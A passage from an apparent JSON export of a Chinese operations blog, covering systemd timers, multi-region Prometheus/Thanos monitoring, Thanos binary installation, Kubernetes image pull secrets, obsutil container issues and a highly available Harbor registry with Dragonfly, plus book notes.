systemctl daemon-reload 启动定时任务 1 systemctl start quick-clear.timer 查看任务状态 1 systemctl status quick-clear.timer 开机自启动 1 systemctl enable quick-clear.timer 查看定时日志 1 2 3 4 journalctl -u quick-clear.timer -f -- Logs begin at Wed 2022-03-30 12:30:27 CST. -- May 26 14:30:17 node3 systemd[1]: Started clear every week. 查看任务执行日志 1 journalctl -u quick-clear.service -f 查看全部定时任务 1 2 3 4 5 6 7 8 9 10 11 12 13 14 systemctl list-timers NEXT LEFT LAST PASSED UNIT ACTIVATES Thu 2022-05-26 15:54:35 CST 1h 23min left Thu 2022-05-26 03:42:34 CST 10h ago ua-messaging.timer ua-messaging.service Thu 2022-05-26 17:58:00 CST 3h 27min left Wed 2022-05-25 17:58:00 CST 20h ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service Thu 2022-05-26 19:56:45 CST 5h 26min left Thu 2022-05-26 11:45:53 CST 2h 44min ago fwupd-refresh.timer fwupd-refresh.service Fri 2022-05-27 00:00:00 CST 9h left Thu 2022-05-26 00:00:00 CST 14h ago logrotate.timer logrotate.service Fri 2022-05-27 00:00:00 CST 9h left Thu 2022-05-26 00:00:00 CST 14h ago man-db.timer man-db.service Fri 2022-05-27 00:00:37 CST 9h left Thu 2022-05-26 14:30:07 CST 35s ago motd-news.timer motd-news.service Fri 2022-05-27 04:38:51 CST 14h left Thu 2022-05-26 14:29:47 CST 55s ago apt-daily.timer apt-daily.service Fri 2022-05-27 06:09:35 CST 15h left Thu 2022-05-26 06:37:25 CST 7h ago apt-daily-upgrade.timer apt-daily-upgrade.service Sun 2022-05-29 03:10:09 CST 2 days left Sun 2022-05-22 03:10:55 CST 4 days ago e2scrub_all.timer e2scrub_all.service Mon 2022-05-30 00:00:00 CST 3 days left Mon 2022-05-23 00:00:00 CST 3 days ago fstrim.timer fstrim.service Wed 2022-06-01 18:53:47 CST 6 days left n/a n/a quick-clear.timer quick-clear.service 5. 参考 http://www.jinbuguo.com/systemd/systemd.timer.html ","description":"","id":162,"section":"post","tags":["博文","Linux","运维"],"title":"使用 systemd timer 配置定时任务","uri":"https://www.chenshaowen.com/blog/how-to-configure-scheduled-task-using-systemd-timer.html"},{"content":"1. 相关背景 待在工作岗位上，总得做点事，也想做点新鲜事。但并不是你想做就有机会去做，并能做好。\n一个人做、还是能和大家一起做，最终的结果是不一样的。这就涉及到时机，大家能否达成一致的动机。\n今年是降本增效的一年，很多公司在裁员、减配降本。因此，对整个线上服务的负载情况汇总，精细化的监控数据有所需求。\n为了合规，海外服务的架构分区，数据分散管理，以前很难想象可以集中数据。但是这种需求，现在有了解决办法。\n在内部的一些系统中，目前的监控系统无法程序化集成，无法通过规则拼接 URL 展示监控相关的数据。\n对于终端用户来说，监控能够与业务形态相匹配，可以快速地找到业务相关的监控数据，将给业务带来极大方便。\n无论从公司预期背景，还是自身规范化需求出发，这都是一个时机成熟、可以尝试推动的事情。\n2. 海外服务的拓扑 对于海外服务，我们需要根据业务发展战略，选择区域部署服务。比如，如果准备在欧洲开展业务，那么就需要选择华为、AWS 等云厂在该地区提供的云服务作为基础设施。对于面向全球的业务，需要在很多区域建设服务节点，包括新加坡、日本、印度、美西等。由于各地区的数据保护条例，不允许将当地的数据传输到其他地区，因此数据和服务只能本地化。\n每个区域是一个独立的对外提供服务的单元，具有独立的数据存储、K8s 集群、API 网关等。这种分区的服务拓扑，会给运维带来很大挑战，需要在每个区逐一进行变更。在 面向全球的镜像分发网络 一文中，我描述了跨地区构建的全球性运维网络。如下图:\n基于公网，通过 StrongVPN、WireGuard 等软件构建企业内网，可以实现在一个中心区域对全区的控制。这种控制包括，全区的应用发布、流量控制、镜像分发、监控告警等。\n在打通全区内网之后，我们接着对监控从三个方面进行了调整，分别是基础资源监控，Kubernetes 监控，业务数据监控。其中，基础资源和 Kubernetes 属于短周期监控数据，而业务数据属于长周期监控数据。短周期监控数据，需要补齐足够的标签方便业务人员过滤查询，使用 Prometheus 监控即可。而长周期监控数据，采用的是 Thanos 方案，避免 Prometheus 查询长周期数据时导致云主机宕机。\n3. 基础监控 在每个区域仅有一个 Prometheus 拉取全部基础资源的监控数据，这些基础资源包括云主机、Redis、MySQL 等中间件。直接上 Prometheus 的配置:\n1 cat /etc/prometheus/prometheus.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 - job_name: \u0026#34;node_exporter\u0026#34; file_sd_configs: - refresh_interval: 1m files: - \u0026#34;/etc/prometheus/file_sd/node*.yml\u0026#34; - job_name: \u0026#39;mongo_exporter\u0026#39; file_sd_configs: - refresh_interval: 1m files: - \u0026#34;/etc/prometheus/file_sd/mongo*.yml\u0026#34; - job_name: \u0026#39;elasticsearch_exporter\u0026#39; file_sd_configs: - refresh_interval: 1m files: - \u0026#34;/etc/prometheus/file_sd/es*.yml\u0026#34; 通过 file_sd_configs 指定 Prometheus 自动发现服务的目录，通过 refresh_interval 指定 Prometheus 重新加载配置文件的周期，当有新的服务需要添加监控时，只需要修改所属类型的资源列表即可。下面接着来看资源列表的定义:\n1 cat /etc/prometheus/file_sd/node-prod.yml 1 2 3 4 5 6 7 - labels: region: \u0026#34;region-a\u0026#34; team_id: 123 host_name: \u0026#34;a-b-c\u0026#34; host_ip: \u0026#34;0.0.0.0\u0026#34; targets: - 0.0.0.0:9100 如下图，每个区一个 Prometheus 拉取监控数据，在中心区域通过 Thanos Query 汇总全部的监控数据，提供全区的监控数据查询能力。\n最终在 Grafana 上需要呈现两个面板，一个是资源的汇总，一个是资源的详情。如下图是基础资源汇总的面板:\n通过汇总面板，我们能够知道指定区域有多少资源、各个资源的负载情况。通过 Thanos Query 汇总数据源，我们能够知道全区的资源概况。\n4. Kubernetes 监控 对于 Kubernetes 监控，我们采用的部署策略是，每个集群安装一个 Prometheus 仅存储 3d 的数据，不进行持久化。在每个区域部署一个 Thanos Query 汇总全部 Kubernetes 的监控数据。下图是相关拓扑：\n根据社区的 Prometheus Helm Chart 包，我们新增了 Thanos Sidecar 重新打包之后，推送到内部 Habor 镜像仓库。新增集群时，只需要进行两步操作：\n安装 Prometheus 1 2 3 4 5 6 export HELM_EXPERIMENTAL_OCI=1 helm chart pull harbor.chenshaowen.com/monitor/prometheus:15.0.1 helm chart export harbor.chenshaowen.com/monitor/prometheus:15.0.1 cd prometheus kubectl create ns monitor helm -n monitor install prom-k8s --set server.global.external_labels.cluster=cluster-1 --set server.global.external_labels.region=region-1 . 这里需要注意的是，通过 external_labels.cluster 给每个 Kubernetes 集群一个唯一的名字。\n在 Thanos Query 中添加查询 API 可以参考前面的文档 使用 Thanos 集中管理多 Prometheus 实例数据\n在 Grafana 面板上，我们提供了两个层级的视角: 分区和全区的数据源，汇总和详情的面板。如下图是其中的一个汇总面板:\n5. 业务数据监控 业务数据主要是业务自行上报、关注的数据，比如，用户登录、下单、支付等。这类数据异构，无法统一进行管理，我们提供统一的解决方案、Grafana 服务，由业务自行绘图即可。\n这里采用的是 Thanos 方案，参考: Thanos 进阶使用指南 。\n下面是部署拓扑图:\n下面是查询长周期数据：\n6. 总结 本篇主要是介绍了最近在做的一些工作，针对海外多区场景，我们将监控分为三层，基础监控、Kubernetes 监控、业务监控数据。其中基础监控，包括云主机、Redis 中间件等，而 Kubernetes 主要是面向应用，业务数据属于业务关系的上报数据。\n针对这三种层次的划分，分别提供了三种部署的方案，满足业务对监控查询的需求。\n","description":"","id":163,"section":"post","tags":["博文","监控","海外","多区"],"title":"海外多区下的监控系统","uri":"https://www.chenshaowen.com/blog/the-monitor-system-cross-multi-region.html"},{"content":"1. 下载二进制文件 1 2 3 4 wget https://github.com/thanos-io/thanos/releases/download/v0.26.0/thanos-0.26.0.linux-amd64.tar.gz tar xvf thanos-0.26.0.linux-amd64.tar.gz mv thanos-0.26.0.linux-amd64/thanos /usr/bin/ rm -rf thanos-0.26.0.linux-amd64* 2. 安装 Thanos Query 1 vim /etc/systemd/system/thanos-query.service 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 [Unit] Description=Thanos Query After=network-online.target [Service] Restart=on-failure ExecStart=/usr/bin/thanos query \\ --log.level=debug \\ --query.auto-downsampling \\ --grpc-address=0.0.0.0:30091 \\ --http-address=0.0.0.0:30092 \\ --query.partial-response \\ --query.replica-label=prometheus_replica \\ --query.replica-label=rule_replica \\ --store=1.0.0.0:30091 \\ --store=2.0.0.0:30091 [Install] WantedBy=multi-user.target --store 参数添加需要聚合的全部源。\n1 systemctl daemon-reload \u0026amp;\u0026amp; systemctl enable thanos-query 1 systemctl start thanos-query \u0026amp;\u0026amp; systemctl status thanos-query 3. 安装 Thanos Sidecar 1 vim /etc/systemd/system/thanos-sidecar.service 1 2 3 4 5 6 7 8 9 10 11 12 13 [Unit] Description=Thanos SideCar After=network-online.target [Service] Restart=on-failure ExecStart=/usr/bin/thanos sidecar \\ --grpc-address=0.0.0.0:30091 \\ --tsdb.path /var/lib/prometheus \\ --prometheus.url \u0026#34;http://localhost:9090\u0026#34; [Install] WantedBy=multi-user.target 这里如果需要上传到对象存储还需要加上 --objstore.config-file /etc/thanos/bucket_config.yaml，指定对象存储相关的参数。\n1 systemctl daemon-reload \u0026amp;\u0026amp; systemctl enable thanos-sidecar 1 systemctl start thanos-sidecar \u0026amp;\u0026amp; systemctl status thanos-sidecar ","description":"","id":164,"section":"post","tags":["监控","Thanos","协议","博文"],"title":"二进制部署 Thanos","uri":"https://www.chenshaowen.com/blog/install-thanos-using-binary.html"},{"content":"作者: 王伟\n出版社: 中信出版社\n出版年: 2017-10-15\nISBN: 9787508667751\nNotes:\n在万年内，地缘是无法改变的事实，也是各位战略家不断深入研究的领域。中国往东，经过日本，越过北太平洋就是美国；中国往西南，经过印度洋、大西洋，也与美国连通。\n美国依靠的是本土的工业、科技能力，通过控制海权，在各地建设军事基地以达到全球威慑，保障自身利益。\n欧洲如战国，只有德国、法国能打。\n俄罗斯地广人稀，资源丰富，但是缺少出海口，无法掌控全球物资的流通，只能寄希望于黑海北岸的克里米亚半岛；而面对欧亚无险可守，只能以攻为守，形成了战斗民族的印象。\n印度坐拥印度洋之便，但中央对地方控制力差，治理混乱，受殖民地国家荼毒很深。同时，英国退出时，与其他国家划分边界留下大量争端，印度无暇顾及其他。\n对于中国，美国扶持日本、韩国控制亚洲的海上门户。岛国没有纵深，无险也无足够后勤，只能依附于大国强国。由于海权被岛链束缚，中国只能继续发展陆权，一带一路由此而来，打通中国通往欧洲、非洲的经济之路。中国内陆是东部经济明显强于西部，而通往欧洲、非洲需要经过西部，因此大力发展西部是必要的，同时也能减小贫富差距、促进民族团结。\n","description":"","id":165,"section":"post","tags":["书籍","地缘","政治"],"title":"一本书看懂地缘世界","uri":"https://www.chenshaowen.com/blog/book/a-book-to-understand-the-geoworld.html"},{"content":"1. 通信协议的选择 运维系统更适合 HTTP 而非 gRpc 。\n熟悉 HTTP 的运维、研发人员比其他协议的人多。在掌握 HTTP 协议的基础上，学习 Restful 风格的 HTTP API 很快。更多人熟悉、更易于学习，意味着更好沟通、更低的交接成本，因为他们有着更多共同的领域背景。\n支持 HTTP 调试的工具非常多。无论是浏览器，还是各种插件，命令行工具，都可以很方便地调试接口。\n系统集成方便。运维人员擅长的是 Shell、Python 等脚本语言，调用一个 HTTP 接口很容易，而不用生成 gRPC Client 进行编程。系统集成的成本低意味着你提供的服务会得到更多使用。\n对于运维系统来说，清晰、简单、兼容性好的通信协议更加重要，而不必强调性能，这与业务系统有着显著差异。\n2. 集中还是分散管理数据 运维系统更适合集中管理数据，而非分散管理数据。\n可以将运维系统认为是整个公司系统的控制平面，而业务系统认为是整个公司系统的数据平面。控制面承载的是控制指令，应用怎么部署、流量怎么走、服务异常时怎么处理等。而数据面承载的是业务用户的数据，浏览页面、下载图片、上传视频等。\n运维系统会对权限、安全、审计等有着比较高的要求，集中管理数据能够很好地满足这一点。而业务存储的是用户数据，为了合规不能跨国家跨地区传输，只能分散就地存储。\n需要强调的是一般的运维系统并发量不大，能有 10K 台机器的公司就已经颇具规模。如果只是考虑人使用，运维系统能够支撑 1K 的 PV 就足以满足绝大多数公司的需求。运维系统对扩展性的要求比业务系统低很多。\n3. CAP 取舍 运维系统选的是 CP，牺牲部分可用性；业务系统选的是 AP，牺牲部分一致性。\n运维系统对一致性要求更高，宁可接口响应慢一点，也一定要同步地完成各种检测，再返回接口，确认调用成功。否则应该立即回滚，并提示用户。\n而业务系统会更在乎用户体验，大多数场景下能够直接返回结果，将任务丢到队列中异步处理。\n4. 简洁胜过一切 在开发运维系统时，应该基于最少的约束和规则进行设计，再考虑其他细节。\n运维系统比业务系统复杂很多，运维系统是 ToB 的，而业务系统是 ToC 的。ToC 的产品最终是面向整个人群的，而 ToB 的产品最终是面向垂直领域的，需要阅读文档、反复尝试才能熟练。因此 ToB 通常还会伴随着一个培训市场，对 ToB 的用户进行指导、答疑、提供解决方案等。\n但运维系统的简洁并不容易，得提升到设计理念的层次，并始终能用这套理念指引系统的设计。这就对团队提出了很高的要求，否则整个产品体系就会显得杂乱无章，用户使用起来也会毫无头绪。想象一下，如果需要进行一次变更，一会儿是命令式，一会儿是声明式，用户使用时得多么迷惑。\n因此在运维系统设计之初，就要将简洁放在第一位，这是为了抵消因满足业务需求引入的复杂性。\n对于运维系统，即使采用 ESB 的架构也是足够的，不必强调微服务，更不要谈网格。复杂度的增加是各种问题的根源。\n","description":"","id":166,"section":"post","tags":["博文","设计","思考","运维","系统"],"title":"运维与业务的系统设计差异","uri":"https://www.chenshaowen.com/blog/the-differences-between-ops-and-business-while-designing-the-system.html"},{"content":"1. 通过 kubectl create 添加 1 kubectl create secret docker-registry mypullsecret --docker-server=harbor.chenshaowen.com --docker-username=robot-test --docker-password=xxxxxx 通过 kubectl create 可以直接添加拉取镜像的凭证。\n2. 通过 ~/.docker/config.json 添加 使用账户密码登录镜像仓库 1 docker login harbor.chenshaowen.com:5000 1 docker login harbor.chenshaowen.com 可以添加多个。\n查看本地保存的凭证 1 2 3 4 5 6 7 8 9 10 11 12 cat ~/.docker/config.json { \u0026#34;auths\u0026#34;: { \u0026#34;harbor.chenshaowen.com:5000\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;xxxxxx\u0026#34; }, \u0026#34;harbor.chenshaowen.com\u0026#34;: { \u0026#34;auth\u0026#34;: \u0026#34;xxxxxx\u0026#34; } } } 对凭证进行 base64 编码 1 2 3 cat ~/.docker/config.json |base64 -w 0 base64XXXXXXXXXXXXXXXXXXXXXX 这里有一个细节，如果编码没有 -w 0 参数，创建负载时可能会遇到 Failed to pull image \u0026quot;harbor.chenshaowen.com:5000/library/nginx:latest\u0026quot;: illegal base64 data at input byte 60 的错误。\n-w 0 的含义是编码之后，不用换行对齐，而是输出完整的一行数据。\n创建 Kubernetes Secret 凭证 利用上面得到的 Base64 编码的凭证创建 Secret。\n1 2 3 4 5 6 7 8 9 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Secret metadata: name: mypullsecret data: .dockerconfigjson: base64XXXXXXXXXXXXXXXXXXXXXX type: kubernetes.io/dockerconfigjson EOF 3. 负载测试 创建负载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: a1 spec: replicas: 1 selector: matchLabels: app: a1 template: metadata: labels: app: a1 spec: containers: - name: a1 image: harbor.chenshaowen.com:5000/library/nginx:latest imagePullPolicy: Always imagePullSecrets: - name: mypullsecret EOF 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: Deployment metadata: name: a2 spec: replicas: 1 selector: matchLabels: app: a2 template: metadata: labels: app: a2 spec: containers: - name: a2 image: harbor.chenshaowen.com/library/nginx:latest imagePullPolicy: Always imagePullSecrets: - name: mypullsecret EOF 检测是否能拉取成功 1 kubectl get pod w 清理测试负载 1 kubectl delete deployments.apps a2 a1 ","description":"","id":167,"section":"post","tags":["博文","Kubernetes"],"title":"给 Kubernetes 添加 imagePullSecrets","uri":"https://www.chenshaowen.com/blog/how-to-add-imagepullsecrets-for-kubernetes.html"},{"content":"1. 容器的 ulimit 设置太小 报错信息:\n1 2 3 4 5 6 7 CheckpointDir: /root/.obsutil_checkpoint OutputDir: /root/.obsutil_output runtime: mlock of signal stack failed: 12 runtime: increase the mlock limit (ulimit -l) or runtime: update your kernel to 5.3.15+, 5.4.2+, or 5.5+ fatal error: mlock failed 如果是 Docker 下，可以在启动时添加 ulimit 参数 1 docker run -it --ulimit memlock=-1 ... 如果是 Kubernetes 下，需要以特权模式启动 Pod 1 2 3 securityContext: privileged: true runAsUser: 0 在 yaml 配置中添加上面的片段，然后在启动脚本中添加 ulimit -c unlimited 修改 ulimit 。\n2. 只读权限的凭证无法使用 报错信息:\n1 Error: open /root/.obsutilconfig: read-only file system 由于以只读权限挂载 .obsutilconfig 凭证到容器，而 obsutil 命令需要对凭证的写权限。\n因此需要在容器启动时，读取并生成凭证。\n1 2 cat /root/.obsutilconfig1 \u0026gt; /root/.obsutilconfig ulimit -c unlimited ","description":"","id":168,"section":"post","tags":["博文","对象存储","容器"],"title":"在容器中使用 obsutil 命令问题","uri":"https://www.chenshaowen.com/blog/some-problems-using-obsutil-commands-in-containers.html"},{"content":"作者: [美] 李政道\n出版社: 清华大学出版社\n出版年: 2000-05\nISBN: 9787302038665\nNotes:\n以前还是挺喜欢阅读数学和物理领域知识的，参加工作之后疲于解决各种项目和技术问题，对世界本真的模样逐渐失去了好奇。得益于作者深厚的功力，这本书能够轻松将各领域、场景下的对称与不对称进行呈现，让人能比较直观的感受到这矛盾之下蕴含的一致性。\n","description":"","id":169,"section":"post","tags":["书籍","物理"],"title":"对称与不对称","uri":"https://www.chenshaowen.com/blog/book/symmetry-and-asymmetry.html"},{"content":"1. 使用 Query 聚合数据 如上图，Thanos Query 可以对接的组件有：\nThanos Store Gateway Thanos Query Thanos Receive Prometheus，借助于 Sidecar 利用 Thanos Query 之间的级联，我们可以实现跨组件的关联查询，组建超大型的监控系统。这也意味着，每个对接的组件应该提供足够快的 Prometheus API。整个接口的响应时间依赖于最慢组件的响应时间。\n当然你也可以在不同层级，提供不同级别的查询数据源。如下图:\n在全局、区域、实例级别都可以提供查询接口。\n2. 指标数据的拆分及生命周期管理 Thanos 采用的是存储空间换计算时间和内存的方式，加速长周期指标的查询。Thanos Compact 组件会将小的存储块，合并为大的存储块。如下图，Compact 组件还提供了对存储块的管理能力:\n在右下角，我们可以标记删除一个存储块，也可以选择不对其进行降采样。\n当打开降采样开关时，Compact 会对所有原始指标数据存储时长大于 40 h 的进行 5 min 采样，对所有 5 min 指标数据存储时长大于 10 day 的进行 1 h 采样。至于，原始数据、5 min 采样指标数据、1 h 采样指标数据保存多长时间，可以通过以下参数配置:\n--retention.resolution-raw=90d，原始数据保存最近 90 天 --retention.resolution-5m=180d，5 分钟采样数据保存 180 天 --retention.resolution-1h=360d，1 小时采样数据保存 360 天，0d 代表永久存储 这意味着，我们只能看到全年 1 h 采样的序列，而局部看不半年前，1 h 之内的任意细节数据；只能看到半年 5 min 采样序列，而局部看不到三个月前，5 min 内的任何细节数据。\n为了避免冲突，一个 Bucket 也只允许运行一个 Compact。而 Compact 的参数，直接决定了一个存储 Bucket 的生命周期。\n当业务规模庞大时，不可能只用一个 Bucket 存储全部监控数据，即使对象存储的性能已经非常好。我们依然需要对数据存储进行拆分，如下图:\n每一个 Store Gateway 都需要配置一个 Bucket 桶，而一个 Bucket 只允许一个 Compact。可以根据以下维度进行划分 Bucket:\n结算方式 所在区域 所属业务 基础设施层级 单指标的横向拆分 3. 将 Prometheus 的存储周期设置为 6 h 刚使用 Thanos 时，会碰到两个迷惑的地方:\n怎么没有最近 2 h 的数据 因为没有配置 Prometheus 的查询源。\n怎么查询速度没有提升 因为 Prometheus 查询源的存储周期太长了。\n答案在下面这张图里:\nSidecar 模式下，每隔 2 h 上传一次数据，因此如果只配置 Store Gateway 的地址，那么 Query 组件将只能查询到超过 2 h 的数据。 当 Prometheus 设置的存储时间太长，就会导致 Query 查询长周期数据时，不能有效利用 Store Gaway 查询降采样数据，而需要等待 Prometheus 也返回结果，不能提升查询性能。 只有将 Prometheus 源以 Sidecar 的 Grpc 的形式接入到 Query 组件并将其设置为短周期时，才能感受到 Thanos 带来的查询性能提升。 通常，将 Prometheus 的 --storage.tsdb.retention.time 参数设置为 3 倍的 Sidecar 上传存储块的周期，也就是 3 * 2 h = 6 h 即可。\n4. 调优 Store Gateway 加速查询 Thanos Store 组件基于对象存储中的指标数据，对外提供给 Thanos Query 查询接口。Store 组件提供了一些可以优化查询的参数。\n4.1 设置缓存 --index-cache-size=250MB 默认会使用内存缓存，加速查询。其他可选的缓存包括，memcached、redis。\n4.2 设置查询范围 --min-time 和 --max-time 参数可以指定当前 Store 能查询的数据范围。\n可以直接根据 RFC3339 规范指定 -min-time=2018-01-01T00:00:00Z,--max-time=2019-01-01T23:59:59Z，也可以指定一个相对时间 --min-time=-6w,--max-time=-2w 只允许查询 2 个星期前但是不超过 6 个 星期的数据。\n这种方式不仅可以控制查询范围，还可以加快接口数据的返回，屏蔽不必要的查询结果。\n另外一个优化的方向是使用 Query Frontend 组件，同样是借助缓存加速查询响应。\n5 重新设计标签系统 使用 Thanos Query 合并多个 Prometheus 数据源之后，遇到的首要问题就是，怎么区分不同数据源的数据。如果没有提前规划好 external_labels 将会导致各种环境、区域下的指标数据混淆在一起，根本无法使用。\n如下图，在每一个 Prometheus 实例中都需要设置一些必要的 Labels 信息，以区分不同的 Prometheus 实例数据。\n另一方面，在查询和使用监控指标数据时，也需要带上这些标签。这部分的工作量会体现在修改 Grafana 的展示面板和查询 API 的参数调整上。\n6. 总结 本篇主要是在生产环境下使用 Thanos 的一些思考和总结。刚开始使用 Thanos 时的目标是，能够部署起来；部署到线上之后的目标是，能够用起来；最后的目标是能够预见一些未来的问题，提前解决掉。\n7 参考 https://thanos.io/tip/components/store.md/ https://thanos.io/tip/components/query.md/#querierquery ","description":"","id":170,"section":"post","tags":["博文","Thanos","监控","存储","指标"],"title":"Thanos 进阶使用指南","uri":"https://www.chenshaowen.com/blog/an-advanced-user-guide-about-thanos.html"},{"content":"1. 全球的网络规划 很多面向全球的多区域基础设施，在设计之初并没有在网络规划上花费太多心思。当业务复杂到一定程度时，又被逼着进行网络调整和优化。而任何网络上的大调整，都将对业务产生巨大影响。最终会陷入进退两难之地，只能投入更多人力，背上历史包袱，一次又一次行走于悬崖之颠。\n如下图是我认为比较理想的一种网络拓扑:\n网络规划主要有如下几点:\n网段划分 在面向全球的业务形态下，网络被割裂为两部分: 海外和中国内地。我更倾向于建立两个中心，国内的核心节点设置在北京，主要面向国内业务；海外的核心节点设置在新加坡，主要面向海外业务。\n因此将 10.128.0.0/16 及以上网段划分给海外，10.127.0.0/16 及以下划分给国内。同时，每个区的网段之间相隔 8，预留一定的扩展空间。\n实现连通 如果是同一个 VPC，那么内网是可达的。但是如果是不同 VPC、不同的厂商、不同的区域之间，我们通常会借助一定的方法实现连通：公网或者专线。\n公网是比较普适的一种方法。我们可以基于公网，搭建 VPN 内网，实现网络连通。但是，公网的连通质量不能得到保障，因此还有一种方式就是专线。\n专线能够实现跨区域的网络连通，但是云专线通常限于同一家云厂商。也就是说，华为云北京的云专线只能连通华为云新加坡，而不能连通 AWS 新加坡。\n配置路由 实现连通只是相当于插上了网线，但是转发数据包时，并不清楚 IP 包的下一跳是哪里，因此还需要配置路由。\n由于设置有两个网络核心，海外的区域与海外的核心节点需要互通，国内的区域与国内的核心节点需要互通。至于其他各区域是否互通，需要看是否有需求。比如，我们需要在内网进行镜像数据的 P2P 分发，那么就需要各区域也互通。\n2. 建设全球镜像分发能力 全球的镜像分发能力是建立在全球 IDC 内网互通的前提下的。我们不能让基础设施暴露于公网之上，全部的镜像数据都是通过内网流量进行传输的。\n如下图是一个全球镜像分发系统:\n我们的研发部门在国内，而部署的服务遍布全球。镜像数据的流转会经过以下流程:\n国内构建镜像并推送到国内的 Habor 中 国内 Habor 同步镜像到海外的 Habor 中 在某个区域，部署海外的应用，拉取镜像 由于每个 Docker 中都配置了 Dget 的地址作为 registry-mirrors，应用镜像被缓存到 Dget 中 在同一个区域，多个副本部署时，都将直接拉取 Dget 中的镜像 3. Habor 的部署与高可用 3.1 部署 Habor Harbor 部署主要有两种方式 Helm Chart 和 Docker Compose。这里推荐的是 Docker Compose，因为作为一个不会频繁变更、稳定性要求高的服务，VM 比 Kubernetes 更适合作为 Habor 的基础设施。\n3.2 高可用 Harbor Harbor 的高可用主要有两种方式:\n共享存储。一致性高，需要部署双活\\主备的存储后端。 多 Harbor 之间同步。一致性不高，镜像同步需要时间。 我建议采用的方案是共享存储，不想等待 Harbor 同步完成，推送完的镜像即可用。如下图，共享存储方案下，需要以双活\\主备的形式部署存储组件:\n关于 LB 的配置有一个小细节：\n如果使用七层 LB 卸载证书，那么后端主机提供的是 80 端口，此时需要在 LB 层将 80 端口转发到 443，否则 docker login 将无法登录。如果使用的是四层 LB，可以不用考虑这个问题。在调试时，还遇到一个问题，由于 VPN、LB 都会修改 IP 包，这可能会导致一些诡异的问题，比如连不上、连接不稳定等。此时，需要关注 MTU 值。\n这里需要共享的组件有:\n共享 PGSQL 可以直接购买云厂商的服务，然后初始化创建表。\n1 2 3 4 5 6 7 8 9 10 11 12 CREATE DATABASE notary_server; CREATE DATABASE notary_signer; CREATE DATABASE harbor ENCODING \u0026#39;UTF8\u0026#39;; CREATE USER harbor; ALTER USER harbor WITH ENCRYPTED PASSWORD \u0026#39;123456\u0026#39;; GRANT ALL PRIVILEGES ON DATABASE notary_server TO harbor; GRANT ALL PRIVILEGES ON DATABASE notary_signer TO harbor; GRANT ALL PRIVILEGES ON DATABASE registry TO harbor; GRANT ALL PRIVILEGES ON DATABASE harbor TO harbor; GRANT ALL PRIVILEGES ON DATABASE clair TO harbor; 在 harbor.yaml 文件中添加外部数据库配置即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 external_database: harbor: host: 1.1.1.1 port: 5432 db_name: harbor username: harbor password: 123456 ssl_mode: disable max_idle_conns: 10 max_open_conns: 100 notary_server: host: 1.1.1.1 port: 5432 db_name: notary_server username: harbor password: 123456 ssl_mode: disable max_idle_conns: 10 max_open_conns: 30 notary_signer: host: 1.1.1.1 port: 5432 db_name: notary_signer username: harbor password: 123456 ssl_mode: disable max_idle_conns: 10 max_open_conns: 30 共享 Redis Harbor 的 Redis 主要存储的是用户登录的会话 Session 信息和 Job Services 的同步、定时任务。如果对可用性要求不太高，可以使用自建的 Redis 实例，因为即使 Redis 的存储数据丢失，对 Harbor 的数据完整性没有影响。\n共享 S3 对象存储 我使用的是华为 OBS 对象存储，这里的 AKSK 需要给 full 权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 storage_service: s3: accesskey: xxx secretkey: xxx region: ap-southeast-3 regionendpoint: https://obs.ap-southeast-3.myhuaweicloud.com bucket: xxx encrypt: false secure: true v4auth: true chunksize: 5242880 multipartcopychunksize: 33554432 multipartcopymaxconcurrency: 100 multipartcopythresholdsize: 33554432 rootdirectory: /registry/ 如果担心 S3 的单点问题，可以购买两个 Bucket，相互同步镜像数据。这样，当其中一个 Bucket 有异常时，可以迅速切换到另外一个 Bucket 恢复服务。\n4. 利用 Dragonfly 节省带宽 为什么需要 Dragonfly 分发镜像? 其中很大的一个原因在于节省带宽，还有就是避免 Habor 的负载过大。\n如果不使用 Dragonfly 镜像分发，那么每次拉取镜像都会向 Habor 请求数据。如下图:\n而采用 Dragonfly 之后，同一个区域只需要请求一次 Harbor，其他请求都可以通过区域内的流量完成。这种方式大大加快了镜像拉取过程，节省了跨区域的带宽，减轻了 Habor 的负载压力。\n5. 总结 最近在给业务重新规划部署一套镜像管理系统，本篇是相关思考和实践的一些总结。\n本文主要从网络规划开始，聊到全球镜像的分发。网络规划主要涉及网段规划、实现连通、配置路由三个部分。而镜像分发主要采用的是 Habor + Dragonfly 的方案。同时，推荐的是采用共享存储的方式部署高可用的 Harbor。\n实际上，在部署完 Habor 之后，我还对各区域拉取镜像的速度进行了测试。另外，还需要将影响 Habor 服务的依赖项配置监控，持续的改进，才能打造好的镜像仓库及分发系统。\n6. 参考 https://github.com/dragonflyoss/Dragonfly2 https://github.com/goharbor/harbor ","description":"","id":171,"section":"post","tags":["博文","镜像","Habor","网络","Kubernetes"],"title":"面向全球的镜像分发网络","uri":"https://www.chenshaowen.com/blog/a-global-images-distribution-network.html"},{"content":"1. 监控的分层 如上图，在建设监控系统时，会采用两种策略:\n分层监控。IaaS、MySQL 中间件、App 层监控分开的好处是，系统之间具有高可用性、容错性。当 App 层监控无法工作时，IaaS 层监控立马就会体现出来。 长短期指标分离。短期指标用来提供给告警系统高频查询近期数据，长期指标用来提供给人查询时间跨度更大的数据集。 这里将其统称为监控的分层策略，只不过一个是以基础设施维度的分层，一个是以时间维度的分层。\n2. 现状与选型 目前的状况是: 没有进行监控的长短期分层，共用一套 Prometheus。查询长周期指标时，Prometheus 所在服务器内存、CPU 使用率飙升，甚至导致监控、告警服务不可用。\n原因在于两点:\n查询长周期数据时，Prometheus 会将大量数据载入内存 Prometheus 载入的不是降采样数据 查询的范围越大，需要的内存就越多。在另外一个生产的方案中，我们采用 VictoriaMetrics 单机版作为远端存储，部署的内存高达 128 GB 。同时，这种方式下还存在丢数据的情况，排查很久之后，才通过参数 honor_timestamps: false 解决。\n而 Prometheus Federation 的方式，只是解决了将多个 Prometheus 